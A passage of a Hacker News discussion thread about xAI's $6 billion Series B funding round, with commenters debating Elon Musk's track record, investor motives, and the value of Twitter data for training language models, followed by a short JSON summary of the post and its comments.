by now. SpaceX is a great success but his job was only providing money through government contracts and having the luck of finding Gwynne Shotwell, seems hard to replicate consistently. Add an ongoing mental breakdown and full on lies (FSD, humans on Mars, Hyperloop, ...) and it doesn't look that good (AI is a bit complex, hard to imagine someone in his state still having the intellectual capacity to really handle this). But yeah a new meme stock can still be a good bet for investors. reply ben_w 51 minutes agorootparent> For Tesla he is not a founder, and they are mostly relying on a 10 year old product (new product is a joke) that'll only maybe saved with tariffs. This is both true and irrelevant. When Musk took over, the Tesla Death Watch was running strong because it had made 100-and-something individual vehicles in total and relied entirely on finding more investors to not go bankrupt. What Tesla needed is exactly what Musk is: a salesman who can sell a dream to both investors and customers. > Add an ongoing mental breakdown and full on lies (FSD, humans on Mars Humans on Mars shouldn't be on that list, even if he's wrong about every specific — it's the point of everything else he does. reply hcarvalhoalves 4 hours agorootparentprevI wouldn't be surprised if they have insider information on upcoming government contract. reply riku_iki 19 minutes agorootparentprevTesla and SpaceX are undeniable successes of peak Mask at his core expertise. Boring and Neiralink are just valuations with unknown revenue base and future which may be not justified, and weak proof to justify another valuation. reply dgellow 11 hours agoparentprevThe Elon Musk Bubble, I really hope so. That’s so much capital and attention that could be spent on actual research instead of over-hyped and over-promised gimmicks reply stockboss 12 hours agoparentprevElon Musk reply belter 11 hours agorootparentElon Musk The Fragrance Elon Musk Prada Leather Jacket Elon Musk Rectangular Sunglasses reply netsharc 10 hours agoparentprevI wonder if the investors are just like crypto-bros and pyramid-schemers. Knowing it's bullshit, but hoping the next dumbass will come tomorrow, next week, etc, to buy it off them where they can make a profit... Considering the price of e.g. BTC, maybe thinking \"People with money can't be this dumb!\" is the dumbass move... reply Intralexical 10 hours agorootparentThat’s when SBF told Sequoia about the so-called super-app: “I want FTX to be a place where you can do anything you want with your next dollar. You can buy bitcoin. You can send money in whatever currency to any friend anywhere in the world. You can buy a banana. You can do anything you want with your money from inside FTX.” Suddenly, the chat window on Sequoia’s side of the Zoom lights up with partners freaking out. “I LOVE THIS FOUNDER,” typed one partner. “I am a 10 out of 10,” pinged another. “YES!!!” exclaimed a third. What Sequoia was reacting to was the scale of SBF’s vision. It wasn’t a story about how we might use fintech in the future, or crypto, or a new kind of bank. It was a vision about the future of money itself—with a total addressable market of every person on the entire planet. “I sit ten feet from him, and I walked over, thinking, Oh, shit, that was really good,” remembers Arora. “And it turns out that that fucker was playing League of Legends through the entire meeting.” “We were incredibly impressed,” Bailhe says. “It was one of those your-hair-is-blown-back type of meetings.” https://www.sequoiacap.com/article/sam-bankman-fried-spotlig... Humans with money are mostly just humans that are much less likely to face real consequences if they eff it up. reply pstuart 1 hour agorootparentHumans with money are mostly just humans that got really lucky. reply MP_1729 1 hour agoprev“You want to know how to paint a perfect painting? It's easy. Make yourself perfect and then just paint naturally.” - Robert M. Pirsig The Musk reasoning here is stupid, but smart. If he makes a superhuman intelligence, he can only ask it \"What is dark matter?\" and it might figure out. I have some big problems with this idea, but it isn't 100% stupid. Just 98% stupid. reply Aeolun 5 hours agoprevHow is it that some people get 6B to understand the true nature of the universe? It’s not like they have a track record of doing anything other than absolutely devastating a previously successful company… If I ask someone to give me 6B to understand the true nature of the universe they’d laugh in my face, but I sort of assume I’d have an even chance of doing better. reply makingstuffs 4 hours agoparentYeah, surely a better group of people to understand the universe would be, I don’t know, a team of Astro physicists whom didn’t buy a social media company so they could push their unfiltered opinions onto the masses. Just a hunch. reply whamlastxmas 4 hours agoparentprevAgreed, Elon has failed at everything he’s attempted and is basically broke these days, along with his companies teetering on the edge of bankruptcy. People need to stop giving him money because all he does is lose it reply pennomi 1 hour agorootparentI mean, other than SpaceX, which created the world’s most reliable rocket, and delivers more mass to orbit than anyone else. Dunno how anyone could consider that a failure. reply yumraj 10 hours agoprevThese investors seems to haven’t learnt a lesson after the Twitter/X eff-up. NVIDIA must be happy, $5.9B will go to it. reply chambo622 13 hours agoprevWhat is the bull case here? They close the gap to Anthropic and become a 4th place player? reply darth_avocado 12 hours agoparentThe bull case is… they will have FSD by the end of the year… 2017… reply artemonster 10 hours agorootparentI still dont understand why elmo is not being investigated for fraud for all these obscenely unreal claims and promises he has made over the years. this is a clear and cut definition of fraud, for which \"female steve jobs\" and another e-trucking clown CEO are doing their time. why not elmo? reply 2OEH8eoCRo0 2 hours agorootparentHe is. https://www.reuters.com/business/autos-transportation/tesla-... reply bboygravity 6 hours agorootparentprevUnreal claims? Getting a deadline wrong? reply darksaints 4 hours agorootparentOMG, Elon’s simps are so fucking delusional. No, being wrong about a deadline is not fraud. Selling something with a promised deadline attached to it, and being wrong about that deadline for 6+ years is fraud. reply asmor 12 hours agorootparentprev2017 in base 16? reply pandemic_region 11 hours agorootparentthat's 7E1. reply mkl 11 hours agorootparent8215. We have a while to wait yet. reply belter 13 hours agoparentprevElon Musk is planning to invoice the AI ....to Tesla and X a la Adam Neumann.... https://www.ft.com/content/2a96995b-c799-4281-8b60-b235e84ae... reply newswasboring 10 hours agorootparentIsn't that ... illegal? He's just using one investor's money to another. reply sangnoir 10 hours agorootparentWell, Elon Musk is holding AI development ransom unless he's granted sufficient shares in Tesla to take his holdings above 25%. So I suppose they can give him billions to solve for self-driving the \"easy\" way, or the \"hard\" way. How this is not a conflict of interest, I do not know; then again it may explain why Elon wants to reincorporate Tesla in Texas - away from Delaware courts reply belter 10 hours agorootparentprevIt worked for Adam reply aaron695 10 hours agoparentprev> What is the bull case here? The real bull case - Elon doesn't kowtow to mentally ill basement nerds and the media/politicians trying to not lose power. Can you image someone running in to tell Elon the fat nerds on HN are in a tizzy about Grok telling people to eat rocks? Other bull case he's obviously silo-ing Twitter for unique training data. Reddit can only ask nicely you don't train off them. Twitter with a good AI could become quite strong. I'm not as bullish on this, but... Twitter is all the cutting edge news. ChatGPT was happy to be years out of date. No one cares Russia has finally manned up and launched a tactical nuke 24 hours after it happens, something new will be trending. This is Twitters strength, to the minute data. One of the AI's will have to specialize in this. reply blackeyeblitzar 13 hours agoparentprevUnique data set. And Elon. And with Elon, comes a great set of talent. From https://x.ai/about > Our team is led by Elon Musk, CEO of Tesla and SpaceX. Collectively our team contributed some of the most widely used methods in the field, in particular the Adam optimizer, Batch Normalization, Layer Normalization, and the discovery of adversarial examples. We further introduced innovative techniques and analyses such as Transformer-XL, Autoformalization, the Memorizing Transformer, Batch Size Scaling, μTransfer, and SimCLR. We have worked on and led the development of some of the largest breakthroughs in the field including AlphaStar, AlphaCode, Inception, Minerva, GPT-3.5, and GPT-4. They are already competitive despite the late start: https://x.ai/blog/grok-1.5v reply infotainment 13 hours agorootparentDoes it, though? That was probably true pre-X™, but it seems like the primary selection metric has gone from “competence” to “doesn’t ever contradict Elon” reply croes 11 hours agorootparentprev>Collectively our team contributed some of the most widely used methods in the field, So they hired some guys from other AI companies. reply bagels 12 hours agorootparentprevWhat unique dataset? Tweets? reply LeoPanthera 12 hours agorootparentYup. They're going to have the greatest training set of trolls, shitposts, and propaganda. The only universe they're going to end up understanding is the one inside Elon's head. reply duskwuff 12 hours agorootparentI, for one, eagerly await the new insights into the universe which will be unlocked by training an AI on dril's tweets. reply threeseed 13 hours agorootparentprevBut we know from Google that unless you can definitively solve the \"is this sentence real or a joke\" datasets like Twitter, Reddit etc are going to be more trouble than they are worth. And Elon's recent polarising nature and the callous nature with which he disbanded the Tesla Supercharger team means that truly talented people aren't going to be as attracted to him as in his early days. They are only going to be there for the money. reply jokethrowaway 12 hours agorootparentThe datasets should not be used for knowledge but to train a language model. Using it for knowledge is bonkers. Why not buy some educational textbook company and use 99.9% correct data? Oh and use RAG while you are at it so you can point to the origin of the information. The real evolution still has to come though, we need to build a reasoning engine (Q*?) which will just use RAG for knowledge and language models to convert its thought into human language reply dagmx 12 hours agorootparentHow does one differentiate knowledge from the language model in an LLM? At least in a way that would provide a benefit? reply kolinko 12 hours agorootparentYou use formal verification for logic and rags for source data. In other words - say you have a model that is semi-smart, often makes mistakes in logic, but sometimes gives valid answers. You use it to “brainstorm” physical equations and then use formal provers to weed out the correct answer. Even if the llm is correct 0.001% of the time, it’s still better than the current algorithms which are essentially brute forcing. reply dagmx 12 hours agorootparentI’m still confused as to the value of training on tweets though in that scenario? If you need to effectively provide this whole secondary dataset to have better answers, what value do the tweets add to training other than perhaps sentiment analysis or response stylization? reply lynx23 12 hours agorootparentprevI still fondly remember the story an OpenAI rep told about fine-tuning with company slack history. Given a question like \"Can you do this and that please.\" the system answered (after being fine-tuned with said history) \"Sure, I'll do it tomorrow.\" Teaches you to carefully select your training data. reply LegitShady 12 hours agorootparentprev>Twitter Supercharger team interesting. reply talldayo 12 hours agorootparentprevI mean, he can try. The world already has a number of AI corporations headed up by totalitarian megalomaniacs though, the market may eventually reward some other course of action. reply klyrs 12 hours agorootparentIf there's one place Musk has proven his worth, it's entering a crowded market late and taking the same approach as the competition. Ah, nevermind. He's just pissing away investor money. Must be fun! reply sundalia 12 hours agorootparentprevUnique? You mean tweets? Yeah sure It's 6B down the drain. Saying grok 1.5 is competitive is a joke, if it was any good it would be ranked well in chatbot arena (https://chat.lmsys.org/). Elon is a master in hyping underperforming things and this is no exception. reply nomel 11 hours agorootparentNo, there is no ranking for Grok. It’s not participating. It would be hard to judge rate of improvement at this point, since the company has only been around for 1.25 years, and grok 1.5 is yet to be released for general access. reply sundalia 3 hours agorootparent>> It’s not participating. I wonder why reply bboygravity 13 hours agoparentprevWhy 4th place? Got a crystal ball of substantiation or is this another case of ordinary Elon bashing? reply chambo622 12 hours agorootparentI would be asking the same question if another company formed in the past year raised $6B to train LLMs. For example, Mistral raised a significantly smaller round at a much lower valuation. Just trying to learn how others see this. reply threeseed 12 hours agorootparentprevBecause Microsoft/OpenAI, Google and Meta have unlimited money and servers to throw at AI. As do Amazon and Apple who aren't just sitting back doing nothing. So I think even 4th place is putting it nicely. Far more likely to be 6th at best. reply bboygravity 6 hours agorootparentBecause winning tech-development or even AI/AGI is about who has the most money and servers?! Since when? If that's the case then why are Meta, Microsoft, Amazon and even Google not nr 1 right now? IMO the deciding factor for success is super obviously leadership. Hence why xAI got 6 billy thrown at it. reply Jensson 5 hours agorootparent> If that's the case then why are Meta, Microsoft, Amazon and even Google not nr 1 right now? Microsoft is nr 1 right now, via OpenAI. Microsoft was behind on AI so they sent their compute for 49% of OpenAI and full access to OpenAI's models. reply retrac98 12 hours agoprevI wish he’d just focus on SpaceX or Tesla (the cars, not the robot). reply dagmx 12 hours agoparentPart of xAI is to be leverage against Tesla not giving him more control. He’s been actively pushing for more control of Tesla for exactly this https://electrek.co/2024/05/20/elon-musk-confirms-threat-giv... reply BrainInAJar 12 hours agoparentprevIt's probably better for both companies that he isn't. Better for him to torch a $6b series B and Twitter than mess up spacex & tesla more than he already has reply andrewinardeer 12 hours agorootparentThe vanity CyberTruck, I get is a mess. And that lands at Elon's feet. What mess is afoot at SpaceX that is his doing? reply tw04 12 hours agorootparentHe’s been mostly too distracted with Twitter. His last one was the launch pad all his engineers told him would be a disaster that he insisted on doing anyway. That legitimately had the possibility to put them out of commission for years had the concrete seriously damaged any nearby residential properties. reply dotnet00 12 hours agorootparentImagine hating someone so much you resort to making stuff up. The engineers did not think it would be a disaster, they thought it would erode as it had in previous testing (which would've been fine since the water plate system was already being designed), but hadn't expected the concrete to shatter the way it did. Nearby residential properties have already either been bought by SpaceX or are otherwise required to be evacuated before launches. Those evacuation notices are a big part of tracking when launches are actually about to happen. reply tw04 34 minutes agorootparentImagine being so emotionally invested in a billionaire who doesn't know who you are, that you think other people are as well. I don't hate Elon because I don't think about Elon beyond commenting on the occasional article he happens to be referenced in and shaking my head when I see him do something stupid. I'm glad he put money towards both projects (Tesla/Space-X) and got them off the ground, and now I wish he would just leave them both alone and let adults run the show. Yes, he literally took ownership of making the call for a concrete pad despite the engineers telling him it was going to fail. https://thenext30trips.com/p/scrappy-special-edition >Elon was clear that the decision to fly in that configuration with no water or diverter was his call, and in this case it almost destroyed the pad, accelerated the rocket’s failure, and led to the program being grounded pending FAA review. Just like he was the one who insisted on a yoke without progressive steering in the Model S that is absolute garbage and quite frankly dangerous, and any real engineer would have told him if he had cared to ask. reply llamaimperative 7 hours agorootparentprevThat’s the point: Gwynn is running SpaceX and has been for a long time. reply croes 10 hours agoprevSo we push billions of dollars into text and picture generators which contribute to more carbon dioxide emissions like MS already showed. At least we will go down with enough spam texts and cat pictures. reply dagmx 13 hours agoprevAre there any notable people associated with this other than Elon? I’m curious what they’re bringing to the table to be able to fetch that valuation. reply silvester23 12 hours agoparentThere used to be a list of people on the about page but they changed it, apparently. Here's a snapshot that still shows it: https://web.archive.org/web/20240415120557/x.ai/about I don't know enough about the AI/ML scene to say if any of these are notable people. reply dagmx 12 hours agorootparentThanks! That page is a good find. Very few of the names stand out to me (being adjacently familiar with the space). However I did search based on your link… (Edit: with the exception of Chris Szegedy, thanks to the reply below for pointing that out) Most of them seem to have been secondary/tertiary people on the projects listed. Definitely feels a bit like resume padding. It’s also unfortunate that searching for the first person after Elon nets results for their domestic abuse arrest over any achievements in the space. Further down, one of the only two women involved is a “creative AI writer/filmmaker”. Not a strong amount of diversity on their roster but also a weird role to highlight. None of this is to diminish the work the people here do or have done, but it’s a startlingly high valuation for a company without high name recognition technical expertise in this domain. Elon has traditionally relied on well known expert partners in the areas he’s expanded into, so this feels like an outlier. reply gregolo 12 hours agorootparentChris Szegedy is a big name at least reply dagmx 12 hours agorootparentAh yeah you’re right. Though I am surprised he lists himself online as co-founder while being so far down the list here. I wonder if everyone on this list is a co-founder? I would imagine they’d have preferred to list by seniority. reply katechon 12 hours agorootparentprevImagine inventing the Adam optimizer just for some guy on Hacker news to accuse you of resume padding reply ml-anon 9 hours agorootparentprevTheir founding team and first few after that are top top tier. Honestly some of the best engineers at DM. Unsurprising really given that he was offering ~$10M/year in comp. The rest? Who knows. reply belter 12 hours agorootparentprevThere is at least one person there at the top of the Technical Team....I don't recognize from the scene, at least his name does not show as author or co-author in any ML papers I can remember reading...a certain Elon Musk.... :-) reply dagmx 12 hours agorootparentWell the question they were responding to (mine) specifically says “other than Elon”. So it’s very fair to exclude him. reply belter 12 hours agorootparentThe question is other than money, is it fair he puts himself on top of the Technical Team? What is next? Andy Jassy as Tech Lead of AWS AI Team? reply dagmx 11 hours agorootparentElon is a megalomaniac who fancies himself an engineer (yes he used to be one, but his with then is oft disparaged) Even if he had the best names in the industry attached, he would always put himself first. I don’t think it’s wrong he’d do so either , because he has a cult of personality that would make him the biggest feature (positive/negative) of any company he is involved with. Hence why I specifically only ask for other people on note here. reply belter 10 hours agorootparentWhen was he an Engineer? reply dagmx 3 hours agorootparentBack in the original X days, he apparently did code to get X off the ground before PayPal bought them. reply sangnoir 10 hours agorootparentprevI heard he was doing code reviews at Twitter... on code printed on paper to determine of he ought to fire or keep the author. reply nomilk 12 hours agoparentprevSomething surprising Sam Altman mentioned on the Lex Fridman podcast was that it only takes about 6 months to get a top physicist up to speed and productive researching AI. So the team could largely be newbies to AI (with extremely good fundamental knowledge/skill), rather than folks we've all heard of from the AI scene. reply symfrog 12 hours agorootparentDoes Sam Altman have any relevant technical experience to make that assessment? Sounds like something someone would say that just lost their key technical team members. reply klyrs 12 hours agorootparentFor whatever it's worth, Scott Aaronson went from incisive skeptic to drooling fanboy in just about that long. Sam, likewise, seems prone to mistaking loyalty for expertise at this point in his career. reply perkolator 7 hours agorootparentprevThere is nothing really surprising about this. Jim Simmons that recently passed away did exactly this in finance decades ago. He didn't build a team of the brightest minds in finance. He hired brilliant people that specifically did not work in finance. I think he even mentioned that astronomy was one of his favorite areas to hire from for finance. I am sure we highly underestimate the indoctrination against new ideas that anyone at the top of a field has been subject to. Humans love to turn everything into a high school prom king/queen popularity election though even when it is obvious the best people for the job didn't even go to the prom. reply rchaud 4 hours agorootparentStructured finance is a math gig where the only constraint is legality. And as history shows, math nerds have no clue how to constrain the runaway damage their structured instruments can cause. I suppose I shouldn't be surprised that AI development appears to be heading the same way. reply YetAnotherNick 13 hours agoparentprevIt's literally the first sentence in the link > Our Series B funding round of $6 billion with participation from key investors including Valor Equity Partners, Vy Capital, Andreessen Horowitz, Sequoia Capital, Fidelity Management & Research Company, Prince Alwaleed Bin Talal and Kingdom Holding, amongst others. reply saghm 13 hours agorootparentThose are the people investing, right? The parent comment sounds like it's asking who is _getting_ the money. reply jefozabuss 12 hours agorootparentprevThe ones that you quoted bring the money not the technical foundation. reply purple-leafy 10 hours agoprevSometimes I pray for a meteor reply ergocoder 12 hours agoprevDid they raise 6B or at 6B valuation? reply danpalmer 11 hours agoparentI would bet money that this is not $6bn in cash that has been raised. It sounds like it is the raise at a $24bn valuation, but I'd bet this is less cash and more varied assets or financial instruments. Whether it's calling Teslas cheap when accounting for your time spent filling up, taking on significant debt rather than selling company shares as Tesla/SpaceX, or leveraging his personal shares for debt, Musk is always pulling some trick to reach numbers like this. That's not to say these sorts of things aren't common among the ultra-rich, but I get the impression Musk does it at every opportunity. All this to say that I don't think $6bn in cash changed hands for this, I'd expect there's credit lines secured on Musk's own valuation of the company, possibly service credits from compute providers (this can even be via VCs), or other clever tricks to inflate it. reply upon_drumhead 12 hours agoparentprevRaised 6B, with something like a 18-24B valuation[1] [1]https://www.bloomberg.com/news/articles/2024-05-23/musk-s-xa... reply jachee 12 hours agorootparentThe market truly is irrational. :D reply rchaud 4 hours agorootparentNo, just A16z, Sequoia and Prince Alwaleed Holdings. reply komali2 12 hours agorootparentprevI should start an AI company. reply aimazon 12 hours agoparentprevconsidering the names involved and why the money is needed, almost certainly $6bn raised reply shreezus 10 hours agoprevNvidia just added $6B in revenue. We’re witnessing an arms race for compute, as compute will likely be the primary constraint for building AGI. reply 3abiton 10 hours agoparent> as compute will likely be the primary constraint for building AGI. Zuck argues it's energy, and I seem to line up behind him. reply rchaud 4 hours agoparentprevAnd Qatar and Deutsche Bank can breathe a sigh of relief, knowing that their next few quarterly interest payments will be coming through after all. reply Aeolun 5 hours agoparentprevYou’d think that at some point someone realizes it’s more profitable to sell shovels… reply naveen99 6 hours agoparentprevArms races tend to bankrupt everyone except the winner. good luck to all participants. reply Brajeshwar 12 hours agoprevFirst (from the title before reading), I thought - wow, I think I should retry using x.ai (Amy) for my Calendar. How much did they sold the domain for? reply dustincoates 12 hours agoparentThe former x.ai (scheduling) sold to an events company a few years ago and shut down. I imagine the domain was pricy, but not as much as for a company actively using it. reply frontalier 12 hours agoparentprevfewer than $6B reply light_triad 11 hours agoprev> We partner closely with X Corp to bring our technology to more than 500 million users of the X app. Investors paid about $12 per X user/bot. Interesting they are opting for a spinoff rather than doing this in house. Perhaps to capitalise on the hype and attract researchers who don't want the baggage of being associated with polarising brands? reply qeternity 9 hours agoprevQuite a few comments here in disbelief and hating on Musk. For all the criticism of Elon, he has been foundational in Paypal, Tesla and SpaceX and OpenAI. Even if you think Tesla is troubled/overvalued, he has built multiple enormous companies, and one of a handful of people to have built a company into a $1T valuation (however fleeting). So yes, the arithmetic for VCs is very straightforward: for better or for worse, Elon Musk is able to execute in the only way that matters to investors. reply halfmatthalfcat 7 hours agoparentFoundational at Paypal and OpenAI? I've heard different. Also leaving out Twitter which has at least halved (if not more) it's valuation. I would say he's batting less than .500, so while still good, not a sure thing in the slightest and the trajectory seems to be on the down. reply Jensson 6 hours agorootparentHe was for OpenAI at least, he recruited key members and convinced them to go get big funding which they did seek from Microsoft instead of Elon himself. Likely OpenAI wouldn't have gotten anywhere without his involvement, they did break off from him since he wanted too much control not because he didn't help them. reply hydroreadsstuff 10 hours agoprevDid they raise 6B or are they valued at 6B and don't disclose the raised amount? Probably the latter? reply lars_francke 12 hours agoprevX.ai used to be a service similar to calendly. I still mourn its shutdown and, seeing this, had hoped that it is resurrected :( reply ravetcofx 12 hours agoparentI've been using the free version of cal.com which has been phenomenal, and there's self hostable option which is nice reply Peer_Rich 5 hours agorootparent♥ thanks man! we're putting a lot of love into our product and happy to help anyone looking to move away from the old x.ai scheduling reply rullopat 12 hours agoprevHe is the richest man in the world and he doesn’t have 6B in the pocket to finance it on his own? reply Bilal_io 12 hours agoparentA rich man doesn't get rich by risking their own money. They risk the money of their investors reply sidcool 12 hours agoparentprevSeeking investment is a sensible way to raise money and be more accountable IMO. And if investors are ready, why would anyone risk their own money? It's plain business sense. reply JumpCrisscross 12 hours agoparentprev> he doesn’t have 6B in the pocket to finance it on his own? This isn’t how you gain allies. reply NewJazz 12 hours agoparentprevHe has to hold as many shares of Tesla right now to make sure he can ram through the compensation package. reply naveen99 5 hours agoparentprevThe ones doing it on their own, are probably doing it privately. One of the reasons for us government asking to know, so atleast they are not kept in the dark. reply stockboss 12 hours agoparentprevwhy do wealthy people get mortgages to buy their homes when they can just pay full cash? reply rvz 12 hours agoparentprevI don't think you know how this works. The rich don't risk with their own money, only the money from others. Even if they do, it is much less of their wealth on the line managed by others to grow it. reply nomilk 12 hours agoparentprevAsset rich doesn't imply cash rich. reply Art9681 7 hours agorootparentThis is the real answer. The other commenters just don't understand how money and wealth works. Net worth doesnt mean liquid money in the bank ready to withdraw. He would have to sell his own assets which would have an impact on their value the quicker he yolo'ed those sales. reply bagels 12 hours agoparentprevWhy risk your own money, when you can risk the money of others, and reap the rewards? reply mvkel 12 hours agoprev> The company’s mission is to understand the true nature of the universe. I would think full-throated development of a diffusion model would make a lot more sense to achieve the mission, since its chief mechanism is separating signal from noise. Considering we're the only beings in the known universe that have language, I'm not sure there are many universal insights to be gleaned from an LLM reply sidcool 12 hours agoprevThat's a huge round. reply wiradikusuma 12 hours agoprevSo.. tech winter over? reply rullopat 10 hours agoparentJust rename your company adding .AI and it will be immediately summer reply abdussamit 12 hours agoprevThis is insanity ... 6B! reply ganzuul 11 hours agoparentTwice the annual budget of the Red Cross. reply floppiplopp 13 hours agoprevAnything Musk is now too many inferior products and broken promises for any sensible investor. Might as well just burn the money. reply chambo622 13 hours agoparentYet the money keeps coming, so I want to learn what I'm missing. reply infotainment 13 hours agorootparentIt’s not just Musk — as soon as you hit a certain level, it basically becomes impossible to fail. I’ve noticed that even if a senior leader is ousted from a company in disgrace, another company will invariably pick that person up fairly quickly. reply piyuv 11 hours agorootparentLike Yahoo’s head of search before they shut down search? reply klyrs 12 hours agorootparentprev> I want to learn what I'm missing. The perverse thing is that betting on the irrational behavior of other investors seems paradoxically rational at this point. Just, don't get caught holding the bag. reply shufflerofrocks 6 hours agorootparentprevinvestors are simply off-setting the losses to the next investor they sell to. Musk brand is still valuable and his bubble keeps growing. It is only the investors present when the bubble bursts that'll be at a loss. You only need to grow your investment, sell it off to the next person, and exit before it happens reply somenameforme 12 hours agorootparentprevIf you take your assumptions as a given and end up at a contradiction, then there is a rather logical explanation. reply kristopolous 12 hours agorootparentprevAt some point it's no longer a product and a company as much as a financial instrument. reply rchaud 4 hours agorootparentprev> so I want to learn what I'm missing. Capitalism isn't meritocratic, and the market for obtaining finance isn't rational. reply andsoitis 4 hours agoparentprev> Anything Musk is now too many inferior products Tesla: \"Tesla maintains an 87% brand retention rate, with Lexus (68%) and Toyota (54%) trailing, according to a new Bloomberg Intelligence survey. Moreover, 81% of prospective US Tesla drivers are new customers switching from competing EV brands.\" -- https://electrek.co/2024/04/09/87-percent-us-tesla-drivers-s... I think you would be hard pressed to find any serious thinker exclaiming that SpaceX and Starling are inferior products. reply rchaud 4 hours agoparentprev> Might as well just burn the money. That's the A16Z bat-signal. reply rapsey 12 hours agoparentprevSpaceX and/or Starlink going public has everyone on their knees begging for a peace of the action. reply ulfw 8 hours agoprevWhat is wrong with investors to give Elon Musk more money for his me-too products? Why would they waste $6,000,000,000? reply andrewstuart 12 hours agoprevDo venture capitalists usually back companies with part time founder/CEOs? reply bagels 12 hours agoparentNo. But they will certainly back ones that have built multiple 100B companies. reply andrewstuart 7 hours agorootparentThere is that, yes. reply goethes_kind 12 hours agorootparentprevAI is not rocket science. It's child's play compared to space tech. reply sidcool 12 hours agorootparentBut we did fly rockets before reaching AI. reply andrethegiant 12 hours agorootparentprevMLComma.ai is better than Tesla FSD I don't know about the other comparisons mentioned, but Hotz himself said comma is/has always been about 2 years behind Tesla. reply spiderice 12 hours agorootparentDid GP ninja edit their comment? I don’t see that quote reply nomilk 12 hours agorootparentYup (what's quoted is precisely what was in the original comment). The reply was very soon (2 minutes) after the original comment, so perhaps GP's author corrected themselves (edited the comment) during that time (prior to noticing the reply). reply blackeyeblitzar 12 hours agoparentprev [–] > BYD is better than Tesla cars Are you aware of the recent issues with BYD and other Chinese EV brands? Entire dealerships have gone up in flames from dangerous vehicles. Not lone incidents but tens of dealerships at least, in just this month. Tesla cars may have flaws but there is no way a BYD can be compared to them even on the basics. And Tesla’s software is simply way better and makes it clear that it was designed by a competent tech company not an old car company. Other brands aren’t on that level yet. reply defrost 12 hours agorootparent [–] > Are you aware of the recent issues with BYD and other Chinese EV brands? No, but I'd like to know more. > Entire dealerships have gone up in flames from dangerous vehicles. Not lone incidents but tens of dealerships at least, in just this month. Wow! Here's one: https://www.bbc.com/news/articles/c2544ndvkepo ( Although no brand is given and it's a \" possibly \" on being caused by an EV ) Can you provide links to 19 more such incidents this month? Cheers. reply throwup238 11 hours agorootparent> However, an investigation later revealed that the fire was started accidentally by a diesel vehicle. https://cardealermagazine.co.uk/publish/fire-service-has-rea... Oops. reply defrost 11 hours agorootparentTo be clear that wasn't the dealership fire this month in the Uk that was \"possibly\" started by an EV .. it was an \"and also\" story tacked on the end: Last October, it was claimed that an electric or hybrid vehicle had started a huge blaze at Luton Airport’s car park, which destroyed 1,400 cars and much of the building structure. However, an investigation later revealed that the fire was started accidentally by a diesel vehicle. So .. we're still shy 19+ dealership fires this month started by Chinese EV's, but at least we can scratch that one from last October's monthly tally. I heard on social media that a witch turned someone into a newt. reply 0xDEADFED5 12 hours agorootparentprevthe main source i can find that seems to be the origin for \"10 BYD dealerships burned since 2021\" (carscoop) references this article: https://www.ntdtv.com/b5/2024/05/16/a103881785.html (which actually lists 11 minus the most recent) translation seems to be mostly accurate, but i can't be arsed into researching the locations listed. but yes, tens of dealerships per month seems like a bit of an exaggeration reply defrost 11 hours agorootparent> tens of dealerships per month seems like a bit of an exaggeration Certainly an extraordinary claim requiring evidence :-) reply blackeyeblitzar 12 hours agorootparentprev [–] Sorry I don’t have a news source, but saw it mentioned in social media. It’s basically a daily occurrence in recent times is my recollection, and often the investigation is done by the offending car company itself rather than public officials, usually resulting in them pointing fingers at something else (like “bad charger”). reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "xAI has raised $6 billion in Series B funding from notable investors like Valor Equity Partners, Vy Capital, and Andreessen Horowitz.",
      "The company has made significant progress in AI development, releasing models such as Grok-1, Grok-1.5, and Grok-1.5V.",
      "The new funding will be used to market xAI’s products, improve infrastructure, and speed up research and development, with a mission to create advanced AI systems that are truthful and beneficial for humanity."
    ],
    "commentSummary": [
      "xAI has secured a $6 billion Series B funding round to investigate the universe's true nature, raising skepticism about the practicality of using language models (LLMs) for such a mission.",
      "Critics question the philosophical and mathematical limits of AI, drawing parallels to the fictional Library of Babel, and express doubts about Elon Musk's ventures, particularly Tesla's Full Self-Driving technology.",
      "Concerns are also raised about Musk's strategy of using Twitter's real-time data for AI training, the qualifications of his team, and the broader speculative investment landscape in the tech industry."
    ],
    "points": 152,
    "commentCount": 232,
    "retryCount": 0,
    "time": 1716787832
  }
]
